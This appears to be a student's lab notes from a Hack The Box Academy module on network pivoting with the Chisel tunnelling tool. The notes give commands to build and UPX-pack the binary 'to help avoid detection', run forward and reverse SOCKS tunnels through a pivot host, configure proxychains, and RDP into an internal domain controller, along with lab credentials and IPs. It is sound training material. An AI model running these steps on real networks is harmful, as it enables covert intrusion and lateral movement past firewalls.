>[!TLDR]  `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

## Setting Up & Using Chisel

### Clone Chisel
```go
git clone https://github.com/jpillora/chisel.git
```

### Build & Transfer Chisel Binary to Pivot Host
```go
cd chisel
```

```go
go build
```

Shrink the binary to help avoid detection
```go
upx brute chisel
```

Verify 
```go
du -hs chisel
```

```go
scp chisel ubuntu@10.129.202.64:~/
```

### On the Pivot host...
```go
./chisel server -v -p 1234 --socks5
```
	- Listens on incoming connections on port 1234
	- Forwards to networks accessible from the pivot host
### On the Attack host...connecting to Chisel server
```go
./chisel client -v 10.129.202.64:1234 socks
```

>[!tip] Modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel

### Edit proxychains
^e3cfc1
```go
datboyblu3@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...127.0.0.1 1080
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

### Use xRDP to pivot to DC
```go
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot

From the server specify with the `--reverse` option like below
```go
sudo ./chisel server --reverse -v -p 1234 --socks5
```

From the client...
```go
./chisel client -v 10.10.14.17:1234 R:socks
```

Edit the `/etc/proxychains` [[#^e3cfc1|edit-proxychains]]

### Connecting to the internal DC
```go
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Questions

Username
```go
ubuntu
```

Password
```go
HTB_@cademy_stdnt!
```

IP
```go
10.129.73.110
```

SSH
```go
ssh ubuntu@10.129.73.110:~/
```

SCP
```go
scp chisel ubuntu@10.129.73.110:~/
```